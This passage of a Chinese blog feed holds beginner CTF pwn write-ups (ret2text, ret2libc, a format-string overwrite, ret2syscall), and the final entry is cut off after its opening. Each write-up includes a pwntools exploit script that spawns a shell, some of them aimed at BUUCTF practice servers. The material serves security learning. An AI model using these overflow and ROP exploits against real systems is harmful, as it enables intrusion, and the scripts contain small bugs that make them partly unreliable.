string">'''b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc'''</span><span class="token comment" spellcheck="true"># 把hex值转成bytes</span>iv <span class="token operator">=</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>iv_hex<span class="token punctuation">)</span>key <span class="token operator">=</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>ciphertext <span class="token operator">=</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>plaintext <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'plaintext:'</span><span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># plaintext: b'6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d'</span></code></pre><p>base64解码得到url</p><p>解压压缩包得</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308292030306.png" alt="image-20230829203026261"></p><p>找了找星铁的文字</p><p>对找得到flag</p><p>NepCTF{HRP_aIways_likes_March_7th}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
    
    
    <category term="ctf，NepCTF" scheme="http://lmarch2.github.io/tags/ctf%EF%BC%8CNepCTF/"/>
    
  </entry>
  
  <entry>
    <title>week6-T1</title>
    <link href="http://lmarch2.github.io/posts/c63e16b3/"/>
    <id>http://lmarch2.github.io/posts/c63e16b3/</id>
    <published>2023-04-01T07:43:53.000Z</published>
    <updated>2024-01-31T02:37:37.721Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Week-6-T1-bjdctf-2020-babystack"><a href="#Week-6-T1-bjdctf-2020-babystack" class="headerlink" title="Week 6 T1 bjdctf_2020_babystack"></a>Week 6 T1 bjdctf_2020_babystack</h2><blockquote><p>2023-02-05WP<br>BUUCTF pwn 第十一题<br>考点：ret2text</p></blockquote><span id="more"></span><p>省略第一步……只开了NX</p><blockquote><p>__isoc99_scanf(“%d”, &amp;nbytes)    让用户输入下次输入时接受的数据的长度</p></blockquote><blockquote><p>read(0, &amp;buf, (unsigned int)nbytes)   用户可以控制长度，实现栈溢出</p></blockquote><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>打开IDA</p><p><img src="https://img-blog.csdnimg.cn/20200802192521891.png"></p><p>找到有/bin/sh<br>找到后门函数</p><p><img src="https://img-blog.csdnimg.cn/20200802192937904.png"></p><p>buf占用的空间为0x10</p><p><img src="https://img-blog.csdnimg.cn/20200802192913332.png"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p><pre><code>from pwn import * p = remote('node4.buuoj.cn',29891)backdoor_addr = 0x4006e6payload =b 'a' * (0x10+8) + p64(backdoor_addr)p.sendline(b'100')p.sendline(payload)p.interactive()</code></pre><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>发现这样也不错，交给工具来找地址</p><p><img src="https://img-blog.csdnimg.cn/4d3c024d108c4bbd85c7ef85fd505712.png"></p><ul><li>变量(unsigned int)nbytes用户可控，且是个无符号函数</li><li><strong>可用-1进行绕过</strong>，这样用户可输入的数据长度就十分巨大了</li><li>接着调用backdoor()即可getshell</li></ul><pre><code>from pwn import *#start# r = process("../buu/bjdctf_2020_babystack")r = remote("node4.buuoj.cn",29891)elf = ELF("../buu/bjdctf_2020_babystack")#paramsbackdoor_addr = elf.symbols['backdoor']#attackr.recvuntil(b"your name:")r.sendline("-1")r.recvuntil(b"name?")payload = b'M' * (0x10 + 8) + p64(backdoor_addr)r.sendline(payload)r.interactive()</code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Week-6-T1-bjdctf-2020-babystack&quot;&gt;&lt;a href=&quot;#Week-6-T1-bjdctf-2020-babystack&quot; class=&quot;headerlink&quot; title=&quot;Week 6 T1 bjdctf_2020_babystack&quot;&gt;&lt;/a&gt;Week 6 T1 bjdctf_2020_babystack&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2023-02-05WP&lt;br&gt;BUUCTF pwn 第十一题&lt;br&gt;考点：ret2text&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="BUUCTF" scheme="http://lmarch2.github.io/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>week4&amp;&amp;week5-T5</title>
    <link href="http://lmarch2.github.io/posts/95338453/"/>
    <id>http://lmarch2.github.io/posts/95338453/</id>
    <published>2023-04-01T07:36:00.000Z</published>
    <updated>2024-01-31T02:37:22.424Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-ciscn-2019-c-1"><a href="#T5-ciscn-2019-c-1" class="headerlink" title="T5 ciscn_2019_c_1"></a>T5 ciscn_2019_c_1</h2><blockquote><p>2023-01-30WP<br>BUUCTF pwn 题<br>考点：栈溢出 ret2libc3</p></blockquote><span id="more"></span><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这不上一题刚做这类？直接模仿一手。。。。<br>file checksec —— 64-bit 开NX</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>运行一下看看</p><p><img src="https://pic1.zhimg.com/80/v2-8b7794a415c00fa88ea4eab73b44e060_1440w.webp"></p><p>再看看IDA</p><p><img src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p><p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p><p><img src="https://img-blog.csdnimg.cn/20200825172042284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>分析  是相同的思想，这里不赘述了，大致流程就是</p><ol><li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li><li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li><li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’/bin/sh‘）</li></ol><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p><pre><code>from pwn import*from LibcSearcher import*p=remote('node4.buuoj.cn',28342)elf=ELF('./ciscn_2019_c_1')main=0x400b28pop_rdi=0x400c83ret=0x4006b9puts_plt=elf.plt['puts']puts_got=elf.got['puts']p.sendlineafter('choice!\n','1')payload='\0'+'a'*(0x50-1+8)payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(main)p.sendlineafter('encrypted\n',payload)p.recvline()p.recvline()puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,'\0'))print hex(puts_addr)libc=LibcSearcher('puts',puts_addr)offset=puts_addr-libc.dump('puts')binsh=offset+libc.dump('str_bin_sh')system=offset+libc.dump('system')p.sendlineafter('choice!\n','1')payload='\0'+'a'*(0x50-1+8)payload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(binsh)payload+=p64(system)p.sendlineafter('encrypted\n',payload)p.interactive()</code></pre><p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p><blockquote><p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p></blockquote><p>覆盖数据payload=b’\0’+b’a’*(0x50-1+8)<br>\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，<br>buf的大小为0x50<br>-1是减去\0<br>+8是覆盖rbp</p><p>这道题的接收非常讲究<br>泄露地址接收时先是两下recvline()，<br>原因</p><blockquote><p>recvline()一次接收到\n;<br>第一次recvline只能到Ciphertext；<br>第二次只能接收到0a<br>第三次的recvuntil才开始处理泄露的got地址。<br>先开一下context_log_lever=’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。</p></blockquote><p>然后再用recvuntil(‘\n’)[:-1].ljust(8,’\0’)来舍弃接收到的字符串最后的’\x0’并向左补齐</p><p>还有<br>这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了<br>32位程序运行执行指令的时候直接去内存地址寻址执行<br>64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序<br>因此要用寄存器存参<br>（为什么呢？？还是不理解啊）<br><img src="https://pic2.zhimg.com/80/v2-64d98b53873c335d7f889b202b92fb9d_1440w.webp"></p><p>注意栈对齐<br><img src="https://pic1.zhimg.com/80/v2-5fb909989f2a46201c004e96d46f6890_1440w.webp"><br>虽然我不懂为什么要……</p><p>还有<br>最后为什么还要再输一个0呢？</p><p><img src="https://pic2.zhimg.com/80/v2-ffa2e57740c5b5b7047a9a03f3183039_1440w.webp"></p><p>搞不懂了    <strong>求助</strong></p><p>其实做这题主要还是模仿大佬们写的exp，好多细节都不清楚，但是感觉做了那么久又不能扔在那边等完全懂了再写题解    <del>感觉好浪费</del><br>还得再研究啊 </p><p>参考资料：<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6——ciscn_2019_c_1</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;T5-ciscn-2019-c-1&quot;&gt;&lt;a href=&quot;#T5-ciscn-2019-c-1&quot; class=&quot;headerlink&quot; title=&quot;T5 ciscn_2019_c_1&quot;&gt;&lt;/a&gt;T5 ciscn_2019_c_1&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2023-01-30WP&lt;br&gt;BUUCTF pwn 题&lt;br&gt;考点：栈溢出 ret2libc3&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="BUUCTF" scheme="http://lmarch2.github.io/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>week4&amp;&amp;week5-T4</title>
    <link href="http://lmarch2.github.io/posts/e234b4c5/"/>
    <id>http://lmarch2.github.io/posts/e234b4c5/</id>
    <published>2023-04-01T07:35:47.000Z</published>
    <updated>2024-01-31T02:37:05.285Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2libc3"><a href="#T4-ret2libc3" class="headerlink" title="T4 ret2libc3"></a>T4 ret2libc3</h2><blockquote><p>2021-01-30WP<br>ctf-wiki ret2libc3<br>考点：栈溢出rop</p></blockquote><span id="more"></span><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这个是真的难……  首先得透彻理解got和plt，其次还得对exp的写作要有一定的熟练度，而且还有各种各样古怪的写法…… 现在我还很多地方琢磨不清楚，只是依葫芦画瓢地复盘了一下，现在这篇题解只是写个大框架，具体细节后面慢慢补充了……</p><p>file checksec —— 32-bit 开NX</p><p><img src="https://pic2.zhimg.com/80/v2-39081f4041a6adc22d72564532642699_1440w.webp"></p><p>漏洞和内存分析和之前的系列题类似，不赘述了</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，既没有system也没有binsh </p><p><img src="https://img-blog.csdnimg.cn/fe4f5738bcd04e6fbe3cd80ed056f189.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知<br>不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）<br>而现在我们有一个puts函数，libc中也有system和binsh</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和/bin/sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可<br>我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -search的网站</a>查询，可得到puts函数system函数和binsh字符串对应的偏移地址</p><p><img src="https://img-blog.csdnimg.cn/66db2c69d62a4149868ab50a5c933698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>（这里直接盗图了……）</p><p>知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，/bin/sh字符串的偏移相加，就可以得到对应的真实地址<br>然后写完整的exp </p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和/bin/sh的地址，拿到shell</p><pre><code>#first expfrom pwn import *elf=ELF('ret2libc3')p=process('./ret2libc3')puts_plt=elf.plt['puts']puts_got=elf.got['puts']start_addr = elf.symbols['_start']payload1=b'A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)p.sendlineafter("!?",payload1)puts_addr=u32(p.recv(4))print("puts_got_addr = ",hex(puts_got_addr))print("puts_plt_addr = ",hex(puts_plt_addr))print("main_plt_addr = ",hex(main_plt_addr))print("puts addr = ", hex(puts_addr))p.interactive()</code></pre><pre><code>#second expfrom pwn import *p = process('./ret2libc3')elf = ELF('./ret2libc3')puts_got_addr = elf.got['puts']puts_plt_addr = elf.plt['puts']main_plt_addr = elf.symbols['_start']print("puts_got_addr = ",hex(puts_got_addr))print("puts_plt_addr = ",hex(puts_plt_addr))print("main_plt_addr = ",hex(main_plt_addr))p.recv()p.sendline(payload)puts_addr = u32(p.recv()[0:4])print("puts_addr = ",hex(puts_addr))sys_offset = 0x03cd10puts_offset = 0x067360sh_offset = 0x17b8cf#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算libc_base_addr = puts_addr - puts_offset #计算出libc基地址sys_addr = libc_base_addr + sys_offset #计算出system的真实地址sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址print("libc_base_addr = ",hex(libc_base_addr))print("sys_addr = ",hex(sys_addr))print("sh_addr = ",hex(sh_addr))payload2 = flat([b'A'*112, p32(sys_addr), "AAAA", p32(sh_addr)])p.sendline(payload2)p.interactive()</code></pre><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>还有其他几种方法目前没用搞懂<br>之后学会了（看懂了）再写过<br><strong>问</strong>：</p><blockquote><p>p.recv()[0:4]和p.recv(4）的区别？？<br>网上没搜到<br>要在本地打通是不是要对libc做什么操作呀</p></blockquote><p>参考资料：<br>  <a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc</a><br>  <a href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3</a><br>  <a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichen二进制安全</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;T4-ret2libc3&quot;&gt;&lt;a href=&quot;#T4-ret2libc3&quot; class=&quot;headerlink&quot; title=&quot;T4 ret2libc3&quot;&gt;&lt;/a&gt;T4 ret2libc3&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2021-01-30WP&lt;br&gt;ctf-wiki ret2libc3&lt;br&gt;考点：栈溢出rop&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="ctf-wiki" scheme="http://lmarch2.github.io/tags/ctf-wiki/"/>
    
  </entry>
  
  <entry>
    <title>week4&amp;&amp;week5-T3</title>
    <link href="http://lmarch2.github.io/posts/7c502166/"/>
    <id>http://lmarch2.github.io/posts/7c502166/</id>
    <published>2023-04-01T07:35:34.000Z</published>
    <updated>2024-01-31T02:36:50.519Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-第五空间2019-决赛-PWN5"><a href="#T3-第五空间2019-决赛-PWN5" class="headerlink" title="T3 [第五空间2019 决赛]PWN5"></a>T3 [第五空间2019 决赛]PWN5</h2><blockquote><p>2023-01-27WP<br>BUUCTF pwn第七题<br>考点：格式化字符串漏洞</p></blockquote><span id="more"></span><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file &amp;&amp; checksec —— 32 bit , 开启NX，开启cannary</p><p><img src="https://pic3.zhimg.com/80/v2-9e3862844f2bd9655cfffdff011bd7da_1440w.webp"></p><p>这就没法栈溢出了<br>运行程序看看输出</p><p><img src="https://pic4.zhimg.com/80/v2-28662f39bf58b3e1ecc77bfbb48c1fab_1440w.webp"></p><p>0x02</p><p>IDA查看代码</p><p><img src="https://pic2.zhimg.com/80/v2-33b5a588a4426ffce92591baff62ae05_1440w.webp"></p><p>先找string window 发现/bin/sh，进一步查看发现程序就是先读取用户名，再读入密码，然后再将用户输入的密码和生成的一个随机密码比较，正确则执行system(/bin/sh)，错误则输出fail</p><p>观察发现printf(&amp;buf);存在格式化字符串漏洞</p><p>（关于格式化字符串漏洞的相关知识会另写一篇）</p><p>0x03</p><p>现在可以利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据就好了 </p><p>首先利用测试数据”AAAA %08x %08x %08x %08x %08x %08x %08x………… “来确定偏移量，</p><p><img src="https://pic4.zhimg.com/80/v2-13630a4e96f63372c3c048636423b0eb_1440w.webp"></p><p>发现输入的数据是栈的第十个</p><p>并且存放生成的随机密码的地址是从0x0804C044开始的，共四字节空间</p><p>所以我们可以用%10$,%11$,%12$,%13$去定位到这4个地址，再用%n修改这些地址里的内容 </p><p><img src="https://pic2.zhimg.com/80/v2-4c6e49700dcdd067c211a07e233208e9_1440w.webp"></p><p>可以构造payload了</p><p>0x04</p><pre><code>from pwn import*    p=remote('node4.buuoj.cn',28332)    addr = 0x804c044    payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)payload+=b'%10$n%11$n%12$n%13$n'    p.sendline(payload)p.sendline(str(0x10101010))p.interactive()</code></pre><p>因为总共输入了四个地址，共16位，所以%n所赋值的数是16，所以用户输入密码时发送的数据为0x10101010</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;T3-第五空间2019-决赛-PWN5&quot;&gt;&lt;a href=&quot;#T3-第五空间2019-决赛-PWN5&quot; class=&quot;headerlink&quot; title=&quot;T3 [第五空间2019 决赛]PWN5&quot;&gt;&lt;/a&gt;T3 [第五空间2019 决赛]PWN5&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2023-01-27WP&lt;br&gt;BUUCTF pwn第七题&lt;br&gt;考点：格式化字符串漏洞&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="入门集训wp" scheme="http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="BUUCTF" scheme="http://lmarch2.github.io/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>week4&amp;&amp;week5-T2</title>
    <link href="http://lmarch2.github.io/posts/b5711f0/"/>
    <id>http://lmarch2.github.io/posts/b5711f0/</id>
    <published>2023-04-01T07:35:07.000Z</published>
    <updated>2024-01-31T02:36:22.417Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-ret2syscall"><a href="#T2-ret2syscall" class="headerlink" title="T2 ret2syscall"></a>T2 ret2syscall</h2><blockquote><p>2023-01-22WP<br>ctf-wiki 基础rop<br>考点：ret2syscall</p></blockquote><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">题目链接</a></p><span id="more"></span><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 32-bit 开启NX保护，堆栈不可执行<br>而且注意这是statically linked（静态链接），不能通过泄露库函数地址获取system函数地址</p><p><img src="https://pic3.zhimg.com/80/v2-ce9f573c1ee908c7343b45691c74ce8e_1440w.webp"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，发现没有system函数可用<br>有gets函数，应该是通过它实现栈溢出</p><p><img src="https://pic1.zhimg.com/80/v2-5cc70f310e93e5c4fb3262ff9297fb44_1440w.webp"></p><p>由0x01可知我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。采取使用ret2syscall即控制程序执行系统调用，获取 shell。</p><p>也就是我们只需要把各个参数放在对应的寄存器中，执行int 0x80 就可实现对系统的调用</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>利用系统调用来获取shell</p><blockquote><p>execve(“/bin/sh”,NULL,NULL)</p></blockquote><p>关于系统调用补充知识见0x05</p><p>构造的目标如下</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>我们要找到系统调用相对于的寄存器的值<br>首先要让EAX = 0xb，那么需要的指令是 pop eax  ；但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，所以pop之后还需要一个ret返回到控制程序执行流， pop eax ；ret</p><p><img src="https://pic1.zhimg.com/80/v2-c204d633f5590e37cb76a002732c2e3c_1440w.webp"></p><p>选择这个地址：</p><blockquote><p>0x080bb196 : pop eax ; ret</p></blockquote><p>同理，查找控制其他三个寄存器的gadget</p><p><img src="https://pic4.zhimg.com/80/v2-1e5731dc562a330b4797360501705ecb_1440w.webp"></p><p>我们选择这个地址：</p><blockquote><p>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</p></blockquote><p>这个可以直接控制其它三个寄存器。</p><p>还要获取/bin/sh的地址0x80BE408</p><p><img src="https://pic4.zhimg.com/80/v2-6141708a6cddca7ad9fd374297af1fe3_1440w.webp"></p><p>还有int 0x80的地址  0x08049421 </p><p><img src="https://pic4.zhimg.com/80/v2-ff0f310e66188f0ab84f3f516e986ee7_1440w.webp"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>可以写exp了</p><pre><code>from pwn import *p = process("./rop")pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat([b'A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])#偏移量的计算方法和ret2text的相同p.sendline(payload)p.interactive()</code></pre><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>补充一些系统调用的相关知识</p><p>Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号（在 /usr/include/x86_64-linux-gnu/asm/unistd_64.h 和 /usr/include/x86_64-linux-gnu/asm/unistd_32.h 分别可以查看 64 位和 32 位的系统调用号。）来区分入口函数。</p><p>操作系统实现系统调用的基本过程是：</p><ol><li>应用程序调用库函数（API）；</li><li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li><li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li><li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li><li>中断处理函数返回到 API 中；</li><li>API 将 EAX 返回给应用程序</li></ol><p>应用程序调用系统调用的过程是：</p><ol><li>把系统调用的编号存入 EAX；</li><li>把函数参数存入其它通用寄存器；</li><li>触发 0x80 号中断（int 0x80）</li></ol><p>Linux在用int 0x80进行系统调用时，调用号存在于EAX，第一个参数存在于EBX，第二个参数存在于ECX，第三个参数存在于EDX</p><p>更多系统调用号可参考    参考文章</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>参考文章：</p><p><a href="https://blog.csdn.net/weixin_44864859/article/details/106213446">ret2syscall知识点及例题</a><br><a href="https://blog.csdn.net/qq_33769475/article/details/121953414#:~:text=%E6%AD%A4%E6%AC%A1%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E4%BB%AC%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%80%E6%AE%B5%E4%BB%A3%E7%A0%81%E6%88%96%E8%80%85%E8%87%AA%E5%B7%B1%E5%A1%AB%E5%86%99%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%8E%B7%E5%BE%97%20shell%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%20gadgets%20%E6%9D%A5%E8%8E%B7%E5%BE%97,shell%EF%BC%8C%E8%80%8C%E5%AF%B9%E5%BA%94%E7%9A%84%20shell%20%E8%8E%B7%E5%8F%96%E5%88%99%E6%98%AF%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E3%80%82%20%E9%87%87%E5%8F%96%E4%BD%BF%E7%94%A8ret2syscall%E5%8D%B3%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%8C%E8%8E%B7%E5%8F%96%20shell%E3%80%82">ret2syscall</a><br><a href="https://www.cnblogs.com/gsharpsh00ter/p/6402104.html">Linux系统调用号 - gsharpsh00ter - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;T2-ret2syscall&quot;&gt;&lt;a href=&quot;#T2-ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;T2 ret2syscall&quot;&gt;&lt;/a&gt;T2 ret2syscall&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2023-01-22WP&lt;br&gt;ctf-wiki 基础rop&lt;br&gt;考点：ret2syscall&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode&quot;&gt;题目链接&lt;/a&gt;&lt;/p&gt;</summary>
    
